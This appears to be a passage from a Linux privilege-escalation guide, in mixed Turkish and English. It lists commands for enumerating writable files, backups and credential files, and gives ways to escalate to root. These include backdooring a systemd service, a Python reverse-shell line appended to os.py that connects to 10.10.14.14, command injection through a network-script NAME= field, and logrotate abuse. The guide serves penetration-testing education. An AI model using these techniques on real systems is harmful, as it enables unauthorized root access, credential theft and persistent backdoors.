Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **modify the Tomcat service configuration file inside /etc/systemd/,** yapabiliyorsanız, o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son dakikalarda değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Parolalar içeren bilinen dosyalar

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), it searches for **birçok olası dosyayı** that could contain passwords.\
**Bunu yapmak için kullanabileceğiniz başka bir ilginç araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac.

### Günlükler

If you can read logs, you may be able to find **içlerinde ilginç/gizli bilgiler**. The more strange the log is, the more interesting it will be (probably).\
Also, some "**bad**" configured (backdoored?) **audit logs** may allow you to **audit log'lara parolaları kaydetme** inside audit logs as explained in this post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Logları okumak için **logları okumaya yetkili grup** [**adm**](interesting-groups-linux-pe/index.html#adm-group) gerçekten faydalı olacaktır.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca dosya adı veya içeriğinde "**password**" kelimesi geçen dosyaları; loglar içindeki IPs ve emails ile hash regex'lerini de kontrol etmelisiniz.\
Ben burada bunların hepsinin nasıl yapılacağını listelemeyeceğim ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) son kontrollerine bakabilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyor ve o klasöre **yazabiliyorsanız** ya da **python kütüphanelerini değiştirebiliyorsanız**, OS kütüphanesini değiştirip backdoorlayabilirsiniz (eğer python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`'daki bir zafiyet, bir log dosyası veya onun üst dizinlerinde **yazma izinleri** olan kullanıcıların potansiyel olarak ayrıcalık yükseltmesine izin verir. Bunun nedeni `logrotate`'in çoğunlukla **root** olarak çalışması ve özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde rastgele dosyaların çalıştırılacak şekilde manipüle edilebilmesidir. İzinleri sadece _/var/log_ içinde değil, log rotasyonu uygulanan herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürümü `3.18.0` ve daha eski sürümleri etkiler

Bu zafiyetle ilgili daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile sömürebilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** ile çok benzerdir; bu nedenle günlükleri değiştirebildiğinizi gördüğünüzde, bu günlükleri kimin yönettiğini kontrol edin ve günlükleri symlinks ile değiştirerek ayrıcalıkları yükseltebilme imkânınız olup olmadığını kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Eğer herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine bir `ifcf-<whatever>` scripti **yazabilirse** **veya** mevcut bir scripti **düzenleyebilirse**, sisteminiz **is pwned** demektir.

Network script'leri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tamamen .INI dosyalarına benzer görünürler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından ~sourced~ edilirler.

Benim durumumda, bu network script'lerinde tanımlı `NAME=` doğru şekilde işlenmiyordu. İsimde **white/blank space** varsa **sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu da **ilk boşluktan sonraki her şey root olarak çalıştırılır** anlamına gelir.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Not: Network ile /bin/id arasında boşluk olduğuna dikkat_)

### **init, init.d, systemd ve rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için **scripts** barındırır; bu, **klasik Linux servis yönetim sistemi**'dir. Bu dizin `start`, `stop`, `restart` ve bazen `reload` servislerini başlatan scriptleri içerir. Bu scriptler doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d`'dir.

Öte yandan, `/etc/init` **Upstart** ile ilişkilidir — Ubuntu tarafından getirilen daha yeni bir **service management** yaklaşımı olup servis yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'e geçişe rağmen, Upstart içindeki uyumluluk katmanı nedeniyle SysVinit scriptleri Upstart yapılandırmalarıyla birlikte hâlâ kullanılır.

**systemd**, talep üzerine daemon başlatma, automount yönetimi ve sistem durumu snapshot'ları gibi gelişmiş özellikler sunan modern bir init ve servis yöneticisidir. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında organize ederek sistem yönetimini kolaylaştırır.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting framework'leri genellikle bir syscall'i hook'layarak ayrıcalıklı kernel fonksiyonlarını userspace bir manager'a açar. Zayıf manager kimlik doğrulaması (ör. FD-order'a dayalı signature kontrolleri veya zayıf parola şemaları) yerel bir uygulamanın manager'ı taklit etmesine ve zaten-rootlu cihazlarda root'a yükselmesine olanak tanıyabilir. Ayrıntılar ve exploitation bilgileri için bakınız:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
